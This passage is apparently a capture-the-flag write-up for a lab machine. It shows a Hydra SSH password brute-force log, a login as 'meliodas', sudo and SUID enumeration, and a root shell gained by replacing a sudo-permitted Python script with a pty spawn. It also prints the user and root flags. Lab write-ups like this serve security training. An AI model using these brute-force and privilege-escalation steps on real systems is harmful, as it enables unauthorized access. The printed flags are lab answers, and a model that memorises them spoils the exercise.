[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "maria" - 204 of 14344422 [child 18] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "gabriela" - 205 of 14344422 [child 19] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "iloveyou2" - 206 of 14344422 [child 55] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "bailey" - 207 of 14344422 [child 62] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "jeremy" - 208 of 14344422 [child 3] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "pamela" - 209 of 14344422 [child 8] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "kimberly" - 210 of 14344422 [child 35] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "gemini" - 211 of 14344422 [child 58] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "shannon" - 212 of 14344422 [child 59] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "pictures" - 213 of 14344422 [child 1] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "asshole" - 214 of 14344422 [child 12] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "sophie" - 215 of 14344422 [child 34] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "jessie" - 216 of 14344422 [child 39] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "hellokitty" - 217 of 14344422 [child 42] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "claudia" - 218 of 14344422 [child 63] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "babygirl1" - 219 of 14344422 [child 9] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "angelica" - 220 of 14344422 [child 11] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "austin" - 221 of 14344422 [child 14] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "mahalko" - 222 of 14344422 [child 20] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "victor" - 223 of 14344422 [child 24] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "horses" - 224 of 14344422 [child 25] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "tiffany" - 225 of 14344422 [child 45] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "mariana" - 226 of 14344422 [child 51] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "eduardo" - 227 of 14344422 [child 53] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "andres" - 228 of 14344422 [child 56] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "courtney" - 229 of 14344422 [child 0] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "booboo" - 230 of 14344422 [child 21] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "kissme" - 231 of 14344422 [child 22] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "harley" - 232 of 14344422 [child 5] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "ronaldo" - 233 of 14344422 [child 23] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "iloveyou1" - 234 of 14344422 [child 13] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "precious" - 235 of 14344422 [child 6] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "october" - 236 of 14344422 [child 38] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "inuyasha" - 237 of 14344422 [child 41] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "peaches" - 238 of 14344422 [child 43] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "veronica" - 239 of 14344422 [child 37] (0/23)
[22][ssh] host: 10.10.253.155   login: meliodas   password: iloveyou1
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 23 final worker threads did not complete until end.
[ERROR] 23 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-26 13:20:46


meliodas : iloveyou1

┌──(kali㉿kali)-[~]
└─$ ssh meliodas@10.10.253.155
The authenticity of host '10.10.253.155 (10.10.253.155)' can't be established.
ED25519 key fingerprint is SHA256:Ykgtf0Q1wQcyrBaGkW4BEBf3eK/QPGXnmEMgpaLxmzs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.253.155' (ED25519) to the list of known hosts.
meliodas@10.10.253.155's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Sat Aug 24 14:51:01 2019 from 192.168.15.118
meliodas@ubuntu:~$ whoami
meliodas
meliodas@ubuntu:~$ pwd
/home/meliodas
meliodas@ubuntu:~$ ls
bak.py  user.txt
meliodas@ubuntu:~$ cat user.txt
6d488cbb3f111d135722c33cb635f4ec

meliodas@ubuntu:~$ cat bak.py 
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
meliodas@ubuntu:~$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py


meliodas@ubuntu:~$ find / -perm -4000 -type f 2>/dev/null | xargs ls -lah
-rwsr-xr-x 1 root root        31K Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root        40K May 15  2019 /bin/mount
-rwsr-xr-x 1 root root        44K May  7  2014 /bin/ping
-rwsr-xr-x 1 root root        44K May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root        40K Mar 26  2019 /bin/su
-rwsr-xr-x 1 root root        27K May 15  2019 /bin/umount
-rwsr-xr-x 1 root root        71K Mar 26  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root        40K Mar 26  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root        74K Mar 26  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root        39K Mar 26  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root        53K Mar 26  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root       134K Jun 10  2019 /usr/bin/sudo
-rwsr-xr-x 1 root root        11K May  8  2018 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-- 1 root messagebus  42K Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root        10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root       419K Mar  4  2019 /usr/lib/openssh/ssh-keysign


Este código es un script de Python que se utiliza para crear un archivo ZIP que contiene el contenido de un directorio especificado. El script comienza importando dos módulos de Python: "os" y "zipfile". Luego define una función "zipdir" que recibe dos argumentos: "path", que es la ruta del directorio que se va a comprimir, y "ziph", que es un objeto "ZipFile" que se utilizará para escribir el archivo ZIP.

La función "zipdir" utiliza el método "os.walk" para recorrer recursivamente el directorio especificado y para obtener una lista de todos los archivos y subdirectorios en ese directorio. Luego, para cada archivo en la lista, utiliza el método "write" del objeto "ZipFile" para añadir el archivo al archivo ZIP.

El código principal del script crea un objeto "ZipFile" llamado "zipf" y especifica la ruta del archivo ZIP que se va a crear ('/var/backups/website.zip') y el modo de escritura ('w'). Luego llama a la función "zipdir" para comprimir el directorio '/var/www/html' en el archivo ZIP y cierra el archivo ZIP utilizando el método "close".

En resumen, este script se utiliza para crear un archivo ZIP que contiene el contenido de un directorio especificado, y se puede utilizar para hacer copias de seguridad de ese directorio o para comprimir el contenido para su fácil distribución.

meliodas@ubuntu:~$ ls -lah
total 40K
drwxr-xr-x 4 meliodas meliodas 4.0K Aug 24  2019 .
drwxr-xr-x 3 root     root     4.0K Aug 23  2019 ..
-rw-r--r-- 1 root     root      353 Aug 23  2019 bak.py

can't edit bak.py so remove it and create a new one with the same 

meliodas@ubuntu:~$ rm bak.py
rm: remove write-protected regular file 'bak.py'? yes
meliodas@ubuntu:~$ ls
user.txt

meliodas@ubuntu:~$ nano bak.py 
meliodas@ubuntu:~$ sudo /usr/bin/python3 /home/meliodas/bak.py
root@ubuntu:~# exit
exit
meliodas@ubuntu:~$ cat bak.py
import pty;pty.spawn("/bin/bash")

or


meliodas@ubuntu:~$ echo 'import pty;pty.spawn("/bin/bash")' > bak.py
meliodas@ubuntu:~$ sudo /usr/bin/python3 /home/meliodas/bak.py
root@ubuntu:~# cat /root/root.txt
e8c8c6c256c35515d1d344ee0488c617


```

![[Pasted image 20221226131618.png]]


user.txt  

*6d488cbb3f111d135722c33cb635f4ec*

root.txt

*e8c8c6c256c35515d1d344ee0488c617*


[[ColddBox Easy]]